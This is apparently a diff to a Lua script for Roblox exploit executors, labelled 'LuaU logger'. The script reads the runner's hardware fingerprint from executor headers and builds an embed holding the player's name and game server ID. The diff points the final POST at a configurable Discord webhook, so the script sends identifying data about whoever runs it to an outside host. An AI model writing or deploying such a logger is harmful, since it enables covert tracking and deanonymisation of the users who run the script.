@@ -52,6 +52,7 @@ local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Bod
 local decoded = game:GetService('HttpService'):JSONDecode(body)
 local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
 hwid = "";
+local blacklisted = ("db29c2f93543b6dbfa6c24b16716e88260cbc29912ccdf49b45e3dd52f2d59e0d72229d8016ff28875ec2c791252a64f6611e169ab235356af1ae2ae432d4e47")
 
 for i, v in next, hwid_list do
 	if decoded.headers[v] then
@@ -67,7 +68,7 @@ local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
 local Content = '';
 local Embed = {
     title = '𝗟𝘂𝗮𝗨 𝗹𝗼𝗴𝗴𝗲𝗿';
-    color = '11966410';
+    color = EmbedColor;
     footer = { text = game.JobId };
     author = {
         name = plr.Name;
@@ -109,7 +110,7 @@ local Embed = {
     timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
 };
 (syn and syn.request or http_request) {
-    Url = '';
+    Url = _G.WebhookURL;
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
